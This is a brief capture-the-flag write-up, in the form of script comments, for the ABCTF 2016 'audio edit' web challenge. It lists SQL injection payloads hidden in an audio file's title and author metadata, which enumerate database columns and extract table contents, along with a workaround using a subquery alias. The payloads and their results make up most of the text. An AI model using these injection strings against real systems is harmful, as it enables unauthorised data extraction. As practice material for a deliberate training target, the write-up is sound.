#https://github.com/ctfs/write-ups-2016/tree/master/abctf-2016/web/audio-edit-200
#sql injection
#modify the title and author (artist) in the file attribute

#a',(SELECT column_name FROM information_schema.columns WHERE table_name = 'audioedit' LIMIT 0,1))-- -a
#id

#a',(SELECT column_name FROM information_schema.columns WHERE table_name = 'audioedit' LIMIT 1,1))-- -a
#file

#a',(SELECT column_name FROM information_schema.columns WHERE table_name = 'audioedit' LIMIT 2,1))-- -a
#author

#a',(SELECT column_name FROM information_schema.columns WHERE table_name = 'audioedit' LIMIT 3,1))-- -a
#title

'''
So finally we wanted see whats in there:

author = a',(SELECT author FROM audioedit.audioedit LIMIT 0,1))-- -a
... but this gave us an insertion error!:(

The problem is you can't select from a database that you're inserting into at the same time... Thanks to Arxenix!:)

So we got around by using AS (select ... as):

author = a',(SELECT author FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:
ABCTF
author = a',(SELECT title FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:
flag
author = a',(SELECT file FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:
supersecretflagf1le.mp3

OR

a', (SELECT GROUP_CONCAT(file) FROM audioedit as tmp)) -- -

supersecretflagf1le.mp3,df0c8c1102ab427c35bde3b03f71ade99304a17f.mp3,c2bb62acaeefc531903030d5bb7140584800638c.mp3,cd88b9204a2eb7...
'''
#https://web.ctflearn.com/audioedit/edit.php?file=supersecretflagf1le.mp3
#use *firefox* to load, chrome can only display the sonogram when the first time the audio uploaded to the site...

